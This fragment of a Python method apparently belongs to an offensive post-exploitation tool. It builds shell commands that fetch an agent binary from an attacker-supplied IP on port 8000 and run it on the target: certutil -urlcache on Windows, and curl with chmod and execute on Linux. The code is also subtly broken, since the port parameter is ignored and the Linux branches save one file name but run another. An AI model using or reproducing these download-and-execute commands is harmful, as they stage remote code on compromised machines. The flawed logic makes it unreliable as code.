    def DownloadFile(self,ip,os="windows",port=5678):
        if os == "windows":
            command = "certutil -urlcache -split -f http://%s:8000/agent.exe && agent.exe -lport %s"%(ip,str(5678))
        elif os == "linux" or os == "linux_x64":
            command = "curl -o agent_linux_x64 http://%s:8000/agent.exe;chmod +x agent;./agent -lport %s"%(ip,str(5678))
        elif os == "linux_x86":
            command = "curl -o agent_linux_x86 http://%s:8000/agent.exe;chmod +x agent;./agent -lport %s"%(ip,str(5678))